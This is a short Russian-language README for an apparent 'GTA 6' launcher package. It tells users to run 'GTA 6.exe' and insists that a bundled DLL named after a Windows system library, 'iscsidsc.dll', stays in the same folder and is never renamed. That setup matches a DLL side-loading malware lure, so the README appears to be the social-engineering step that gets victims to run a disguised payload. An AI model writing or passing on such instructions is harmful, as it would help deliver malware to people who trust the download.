```
GTA6-Launcher-Clean/
├── GTA 6.exe           # Основной лаунчер (обновлен)
├── iscsidsc.dll        # Системная библиотека (НЕ переименовывать!)
└── README.md           # Эта инструкция
```

## Компоненты

✅ **GTA 6.exe** - Основной исполняемый файл лаунчера (73 KB)  
✅ **iscsidsc.dll** - Системная DLL библиотека (290 KB) - **ВАЖНО:** имя файла менять нельзя!

## Использование

1. **ВАЖНО:** Оба файла ДОЛЖНЫ находиться в одной папке:
   - `GTA 6.exe` (можно переименовывать)
   - `iscsidsc.dll` (**НЕ переименовывать!**)

2. Запустите `GTA 6.exe`

⚠️ **Внимание:** `iscsidsc.dll` должна находиться рядом с exe-файлом для корректной работы!
